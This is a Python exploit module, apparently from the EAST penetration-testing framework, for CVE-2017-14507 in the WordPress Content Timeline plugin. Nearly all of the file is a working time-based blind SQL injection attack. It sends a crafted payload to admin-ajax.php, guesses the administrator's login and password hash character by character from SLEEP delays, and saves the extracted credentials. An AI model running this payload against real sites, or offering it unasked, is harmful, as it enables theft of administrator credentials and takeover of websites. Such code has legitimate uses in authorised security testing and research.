#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import urllib
import urllib2
import string
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_content_timeline_bsqli"
INFO['DESCRIPTION'] = "Wordpress Plugin Content Timeline - SQL Injection"
INFO['VENDOR'] = "https://www.shindiristudio.com/plugins/wordpress-plugins/content-timeline/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://wpvulndb.com/vulnerabilities/8921']
INFO["CVE Name"] = "CVE-2017-14507"
INFO["NOTES"] = """
Blind SQL Injection vulnerability in "timeline" parameter
"""
INFO['CHANGELOG'] = "11 Oct 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.207', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = '')
OPTIONS["TTL"] = 5, dict(description = '')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.ssl = False
        self.port = port
        self.host = host
        self.ttl = 5
        self.basepath = '/wordpress'
        self.pool = string.ascii_letters + string.digits + ':$/\\+'
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        self.ttl = int(self.args.get('TTL', self.ttl))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        
        if self.ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=context))
            urllib2.install_opener(opener)
        
        self.url = self.make_url('/wp-admin/admin-ajax.php?action=ctimeline_frontend_get&timeline=111')
        self.data = ' AND (SELECT * FROM (select IF((SUBSTRING((SELECT CONCAT(user_login,CHAR(58),user_pass) FROM wp_users where id=1),{pos},1)) = CHAR({char}), SLEEP({ttl}), 1))A)'.replace(' ', '%20')
        
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def guess_letter(self, pos):
        for c in self.pool:
            data = self.data.format(pos=pos, char=ord(c), ttl=self.ttl)
            start = time.time()
            try:
                urllib2.urlopen(self.url + data).read()
            except:
                pass
            if time.time() - start >= self.ttl:
                return c
        return None
        
    def run(self):
        self.args()
        self.log('')
        
        self.log('Begin extracting admin\'s credentials')
        self.log('This may take about 15 minutes')
        
        i, result = 1, ''
        char = self.guess_letter(i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(i)
        
        if result:
            self.log('End with: {}'.format(result))
            self.writefile(result)
            self.finish(True)
            return 1
        
        self.log('Failed')
        self.finish(False)
        return 0

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()